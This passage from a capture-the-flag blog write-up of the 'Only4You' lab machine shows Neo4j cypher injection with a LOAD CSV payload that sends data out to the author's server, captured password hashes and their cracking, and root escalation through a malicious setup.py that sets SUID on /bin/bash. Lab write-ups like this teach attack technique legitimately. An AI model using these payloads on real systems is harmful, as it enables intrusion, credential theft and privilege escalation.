</span></span></code></pre></div><p>It will get the server version and print it into our web server:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>‚îå‚îÄ‚îÄ<span style=color:#666>(</span>achla„âøachla<span style=color:#666>)</span>-<span style=color:#666>[</span>~<span style=color:#666>]</span>
</span></span><span style=display:flex><span>‚îî‚îÄ$ python -m http.server <span style=color:#666>80</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#666>80</span> <span style=color:#666>(</span>http://0.0.0.0:80/<span style=color:#666>)</span> ...
</span></span><span style=display:flex><span>10.10.11.210 - - <span style=color:#666>[</span>01/May/2023 22:08:43<span style=color:#666>]</span> code 400, message Bad request syntax <span style=color:#666>(</span><span style=color:#b44>&#39;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#39;</span><span style=color:#666>)</span>
</span></span><span style=display:flex><span>10.10.11.210 - - <span style=color:#666>[</span>01/May/2023 22:08:43<span style=color:#666>]</span> <span style=color:#b44>&#34;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#34;</span> <span style=color:#666>400</span> -
</span></span></code></pre></div><p>As we can see the version is 5.6 and it proves to us that the web application is vulnerable to cypher injection.
Again on HackTricks there is a payload to get properties of a key:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&#39; OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM &#39;http://10.0.2.4:8000/?&#39; + p +&#39;=&#39;+toString(f[p]) as l RETURN 0 as _0 //
</span></span></code></pre></div><p>Of course we need to change the key name and here we guess that the key is <code>user</code>.
Here is the output we got:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</span></span><span style=display:flex><span>10.10.11.210 - - [01/May/2023 22:13:46] &#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34; 200 -
</span></span><span style=display:flex><span>10.10.11.210 - - [01/May/2023 22:13:46] &#34;GET /?username=admin HTTP/1.1&#34; 200 -
</span></span><span style=display:flex><span>10.10.11.210 - - [01/May/2023 22:13:46] &#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34; 200 -
</span></span><span style=display:flex><span>10.10.11.210 - - [01/May/2023 22:13:46] &#34;GET /?username=john HTTP/1.1&#34; 200 -
</span></span><span style=display:flex><span>10.10.11.210 - - [01/May/2023 22:13:46] &#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34; 200 -
</span></span></code></pre></div><p>So we got two SHA-256 hashes, one for admin and one for john
Unfortunatly we can&rsquo;t crack the hash for admin using rockyou as wordlist
but we can crack the hash for john using john the ripper</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john <span style=color:#a2f>hash</span> --wordlist<span style=color:#666>=</span>/usr/share/wordlists/rockyou.txt --format<span style=color:#666>=</span>raw-sha256
</span></span></code></pre></div><p>I&rsquo;ve already craked the hash so I just have to do : <code>john hash --show --format=raw-sha256</code>
Next we can ssh as john and grab the user flag.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ id
</span></span><span style=display:flex><span><span style=color:#b8860b>uid</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span> <span style=color:#b8860b>gid</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span> <span style=color:#b8860b>groups</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span>
</span></span><span style=display:flex><span>john@only4you:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>john@only4you:~$
</span></span></code></pre></div><h2 id=shell-as-root><strong>Shell as root</strong> <a href=#shell-as-root class=anchor>üîó</a></h2><p>By making <code>sudo -l</code> as john, we see that we can use <code>pip3</code> with the download option as root
I&rsquo;ve found an interesting <a href=https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ target=_blank rel=noopener>blog post</a>
about how we can abuse this to build a malicious python package to escalate our privileges:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#a2f;font-weight:700>for</span> john on only4you:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    <span style=color:#b8860b>secure_path</span><span style=color:#666>=</span>/usr/local/sbin<span style=color:#b62;font-weight:700>\:</span>/usr/local/bin<span style=color:#b62;font-weight:700>\:</span>/usr/sbin<span style=color:#b62;font-weight:700>\:</span>/usr/bin<span style=color:#b62;font-weight:700>\:</span>/sbin<span style=color:#b62;font-weight:700>\:</span>/bin<span style=color:#b62;font-weight:700>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User john may run the following commands on only4you:
</span></span><span style=display:flex><span>    <span style=color:#666>(</span>root<span style=color:#666>)</span> NOPASSWD: /usr/bin/pip3 download http<span style=color:#b62;font-weight:700>\:</span>//127.0.0.1<span style=color:#b62;font-weight:700>\:</span>3000/*.tar.gz
</span></span></code></pre></div><p>In order to do that we must forward port 3000 with ssh: <code>ssh -L 3000:127.0.0.1:3000 john@only4you.htb</code>
We forward port 3000 because there is Gogs service running on it which is similar to Git service.
Once logged in as john using the same password used for ssh we found a repository named test.</p><p><p class=markdown-image><img src=/only4you_gogs.png alt="image text"></p></p><p>So to summarize we need to successfully gain root on the machine we need to:</p><ul><li>Create our malicious python package</li><li>Upload it</li><li>Make the repository public (default private)</li></ul><p>The link above provide a GitHub link with some python code ready for us.
After downloading it we modify it a little bit:</p><h3 id=setuppy-file><strong>Setup.py file</strong> <a href=#setuppy-file class=anchor>üîó</a></h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>setuptools</span> <span style=color:#a2f;font-weight:700>import</span> setup, find_packages
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>setuptools.command.install</span> <span style=color:#a2f;font-weight:700>import</span> install
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>setuptools.command.egg_info</span> <span style=color:#a2f;font-weight:700>import</span> egg_info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>RunCommand</span>():
</span></span><span style=display:flex><span>    os<span style=color:#666>.</span>system(<span style=color:#b44>&#34;chmod u+s /bin/bash&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>RunEggInfoCommand</span>(egg_info):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>run</span>(self):
</span></span><span style=display:flex><span>        RunCommand()
</span></span><span style=display:flex><span>        egg_info<span style=color:#666>.</span>run(self)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>RunInstallCommand</span>(install):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>run</span>(self):
</span></span><span style=display:flex><span>        RunCommand()
</span></span><span style=display:flex><span>        install<span style=color:#666>.</span>run(self)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>setup(
</span></span><span style=display:flex><span>    name <span style=color:#666>=</span> <span style=color:#b44>&#34;exploit&#34;</span>,
</span></span><span style=display:flex><span>    version <span style=color:#666>=</span> <span style=color:#b44>&#34;0.0.1&#34;</span>,
</span></span><span style=display:flex><span>    license <span style=color:#666>=</span> <span style=color:#b44>&#34;MIT&#34;</span>,
</span></span><span style=display:flex><span>    packages<span style=color:#666>=</span>find_packages(),
</span></span><span style=display:flex><span>    cmdclass<span style=color:#666>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#b44>&#39;install&#39;</span> : RunInstallCommand,
</span></span><span style=display:flex><span>        <span style=color:#b44>&#39;egg_info&#39;</span>: RunEggInfoCommand
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>Basically we give the SUID bit to /bin/bash which will allows us to execute a command as root (because root user will set the SUID bit)
The next step is to build the python package with <code>python -m build</code>.
Now we get the <code>.tar.gz</code> file in <code>dist/</code> directory and upload it into the <code>Test</code> repository on Gogs and make the repository public.
Finally download it using the pip command:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ sudo /usr/bin/pip3 download http<span style=color:#b62;font-weight:700>\:</span>//127.0.0.1<span style=color:#b62;font-weight:700>\:</span>3000/john/Test/raw/master/exploit-0.0.1.tar.gz
</span></span><span style=display:flex><span>Collecting http://127.0.0.1:3000/john/Test/raw/master/exploit-0.0.1.tar.gz
</span></span><span style=display:flex><span>  Downloading http://127.0.0.1:3000/john/Test/raw/master/exploit-0.0.1.tar.gz <span style=color:#666>(</span><span style=color:#666>846</span> bytes<span style=color:#666>)</span>
</span></span><span style=display:flex><span>  Saved ./exploit-0.0.1.tar.gz
</span></span><span style=display:flex><span>Successfully downloaded exploit
</span></span><span style=display:flex><span>john@only4you:~$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#666>1</span> root root <span style=color:#666>1183448</span> Apr <span style=color:#666>18</span>  <span style=color:#666>2022</span> /bin/bash
</span></span><span style=display:flex><span>john@only4you:~$
</span></span></code></pre></div><p>As you can see /bin/bash has the SUID bit set, all we need is to do <code>/bin/bash -p</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ /bin/bash -p
</span></span><span style=display:flex><span>bash-5.0# id
</span></span><span style=display:flex><span><span style=color:#b8860b>uid</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span> <span style=color:#b8860b>gid</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span> <span style=color:#b8860b>euid</span><span style=color:#666>=</span>0<span style=color:#666>(</span>root<span style=color:#666>)</span> <span style=color:#b8860b>groups</span><span style=color:#666>=</span>1000<span style=color:#666>(</span>john<span style=color:#666>)</span>
</span></span><span style=display:flex><span>bash-5.0#
</span></span></code></pre></div><p>Congrats! We are root.
I really enjoyed doing this box because I learned about cypher injection but also the path
to gain user access was really fun.</p></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/achla95 rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a><a class=symbol href=https://twitter.com/achla95 rel=me target=_blank><svg fill="#bbb" width="28" height="28" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="438.536" height="438.536" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536"><g><path d="M414.41 24.123C398.333 8.042 378.963.0 356.315.0H82.228C59.58.0 40.21 8.042 24.126 24.123 8.045 40.207.003 59.576.003 82.225v274.084c0 22.647 8.042 42.018 24.123 58.102 16.084 16.084 35.454 24.126 58.102 24.126h274.084c22.648.0 42.018-8.042 58.095-24.126 16.084-16.084 24.126-35.454 24.126-58.102V82.225C438.532 59.576 430.49 40.204 414.41 24.123zM335.471 168.735c.191 1.713.288 4.278.288 7.71.0 15.989-2.334 32.025-6.995 48.104-4.661 16.087-11.8 31.504-21.416 46.254-9.606 14.749-21.074 27.791-34.396 39.115-13.325 11.32-29.311 20.365-47.968 27.117-18.648 6.762-38.637 10.143-59.953 10.143-33.116.0-63.76-8.952-91.931-26.836 4.568.568 9.329.855 14.275.855 27.6.0 52.439-8.565 74.519-25.7-12.941-.185-24.506-4.179-34.688-11.991-10.185-7.803-17.273-17.699-21.271-29.691 4.947.76 8.658 1.137 11.132 1.137 4.187.0 9.042-.76 14.56-2.279-13.894-2.669-25.598-9.562-35.115-20.697-9.519-11.136-14.277-23.84-14.277-38.114v-.571c10.085 4.755 19.602 7.229 28.549 7.422-17.321-11.613-25.981-28.265-25.981-49.963.0-10.66 2.758-20.747 8.278-30.264 15.035 18.464 33.311 33.213 54.816 44.252 21.507 11.038 44.54 17.227 69.092 18.558-.95-3.616-1.427-8.186-1.427-13.704.0-16.562 5.853-30.692 17.56-42.399 11.703-11.706 25.837-17.561 42.394-17.561 17.515.0 32.079 6.283 43.688 18.846 13.134-2.474 25.892-7.33 38.26-14.56-4.757 14.652-13.613 25.788-26.55 33.402 12.368-1.716 23.88-4.95 34.537-9.708C357.458 149.793 347.462 160.166 335.471 168.735z"/></g></svg></a></div><div class=copyright>¬© Copyright
2023
<span class=split><svg fill="#bbb" width="15" height="15" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15"><path d="M13.91 6.75c-1.17 2.25-4.3 5.31-6.07 6.94-.1903.1718-.4797.1718-.67.0C5.39 12.06 2.26 9 1.09 6.75-1.48 1.8 5-1.5 7.5 3.45 10-1.5 16.48 1.8 13.91 6.75z"/></svg></span>Achla</div></footer></body></html>